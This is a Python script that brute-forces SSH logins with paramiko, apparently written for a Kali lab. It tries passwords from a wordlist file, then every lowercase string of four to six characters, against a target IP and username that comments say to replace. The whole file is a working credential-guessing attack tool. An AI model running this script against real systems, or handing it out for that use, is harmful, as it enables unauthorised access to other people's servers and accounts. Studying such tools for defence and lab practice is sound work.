import paramiko
import time
import itertools
import string

# Function to attempt SSH login
def ssh_brute_force(target_ip, username, password):
    try:
        # Create an SSH client object
        ssh = paramiko.SSHClient()
        # Automatically add untrusted hosts (for demonstration purposes)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Attempt to connect using the provided username and password
        ssh.connect(target_ip, username=username, password=password, timeout=3)
        print(f"[+] Success: Username: {username} | Password: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: Username: {username} | Password: {password}")
        return False
    except Exception as e:
        print(f"[*] Error: {str(e)}")
        return False

# Define the target and login details
def filebased():
    target_ip = "127.0.0.1"  # Replace with the target IP address or hostname
    username = "kali"        # Replace with the target username
    password_file = "passwords.txt"  # Replace with your password file

    # Read the password file
    with open(password_file, 'r') as f:
        passwords = f.readlines()

    # Loop through each password and attempt an SSH login
    for password in passwords:
        password = password.strip()  # Remove any extra whitespace
        success = ssh_brute_force(target_ip, username, password)
        
        if success:
            print(f"[!] Password found: {password}")
            return password
        time.sleep(1)  # Add delay between attempts to avoid overloading the server

def bruitebased():

    # Define the alphabet (lowercase letters)
    alphabet = string.ascii_lowercase

    # Iterate through combinations of lengths from 1 to 6
    for length in range(4, 7):  # lengths 1 to 6
        for combination in itertools.product(alphabet, repeat=length):
            # Join the tuple into a string
            print(''.join(combination))
           
            target_ip = "127.0.0.1"  # Replace with the target IP address or hostname
            username = "kali"        # Replace with the target username
            success = ssh_brute_force(target_ip, username, ''.join(combination))
            if success:
                print(''.join(combination))
                return ''.join(combination)
    return ''

    
